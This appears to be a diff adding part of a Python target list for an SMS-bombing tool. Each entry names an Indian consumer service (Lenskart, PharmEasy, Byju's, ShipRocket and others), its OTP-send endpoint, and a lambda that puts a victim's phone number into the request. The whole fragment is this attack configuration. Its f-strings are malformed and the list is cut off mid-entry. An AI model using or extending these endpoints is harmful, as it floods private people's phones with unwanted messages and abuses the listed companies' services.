@@ -1,0 +1,129 @@
+"name": "Lenskart SMS",
+         "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"phoneCode":"+91","telephone":"{phone}"}}'
+     }, {
+         "name": "NoBroker SMS",
+         "url": "https://www.nobroker.in/api/v3/account/otp/send",
+         "method": "POST",
+         "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+         "data": lambda phone: f "phone={phone}&countryCode=IN"
+     }, {
+         "name": "PharmEasy SMS",
+         "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"phone":"{phone}"}}'
+     }, {
+         "name": "Wakefit SMS",
+         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"mobile":"{phone}"}}'
+     }, {
+         "name": "Byju's SMS",
+         "url": "https://api.byjus.com/v2/otp/send",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"phone":"{phone}"}}'
+     }, {
+         "name": "Hungama OTP",
+         "url": "https://communication.api.hungama.com/v1/communication/otp",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
+     }, {
+         "name": "Meru Cab",
+         "url": "https://merucabapp.com/api/otp/generate",
+         "method": "POST",
+         "headers": { "Content-Type": "application/x-www-form-urlencoded" },
+         "data": lambda phone: f "mobile_number={phone}"
+     }, {
+         "name": "Doubtnut",
+         "url": "https://api.doubtnut.com/v4/student/login",
+         "method": "POST",
+         "headers": { "content-type": "application/json; charset=utf-8" },
+         "data": lambda phone: f '{{"phone_number":"{phone}","language":"en"}}'
+     }, {
+         "name": "PenPencil",
+         "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+         "method": "POST",
+         "headers": { "content-type": "application/json; charset=utf-8" },
+         "data": lambda phone: f '{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
+     }, {
+         "name": "Snitch",
+         "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"mobile_number":"+91{phone}"}}'
+     }, {
+         "name": "Dayco India",
+         "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
+         "method": "POST",
+         "headers": { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
+         "data": lambda phone: f "api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
+     }, {
+         "name": "BeepKart",
+         "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"phone":"{phone}","city":362}}'
+     }, {
+         "name": "Lending Plate",
+         "url": "https://lendingplate.com/api.php",
+         "method": "POST",
+         "headers": { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
+         "data": lambda phone: f "mobiles={phone}&resend=Resend"
+     }, {
+         "name": "ShipRocket",
+         "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"mobileNumber":"{phone}"}}'
+     }, {
+         "name": "GoKwik",
+         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+"data": lambda phone: f '{{"phone":"{phone}","country":"in"}}'
+     }, {
+         "name": "NewMe",
+         "url": "https://prodapi.newme.asia/web/otp/request",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"mobile_number":"{phone}","resend_otp_request":true}}'
+     }, {
+         "name": "Univest",
+         "url": lambda phone: f "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}",
+         "method": "GET",
+         "headers": {},
+         "data": None
+     }, {
+         "name": "Smytten",
+         "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"phone":"{phone}","email":"test@example.com"}}'
+     }, {
+         "name": "CaratLane",
+         "url": "https://www.caratlane.com/cg/dhevudu",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json" },
+         "data": lambda phone: f '{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'
+     }, {
+         "name": "BikeFixup",
+         "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json; charset=UTF-8" },
+         "data": lambda phone: f '{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
+     }, {
+         "name": "WellAcademy",
+         "url": "https://wellacademy.in/store/api/numberLoginV2",
+         "method": "POST",
+         "headers": { "Content-Type": "application/json; charset=UTF-8" },
+         "data": lambda phone: f '{{"contact_no":"{phone}"}}'
+
+
+
+         
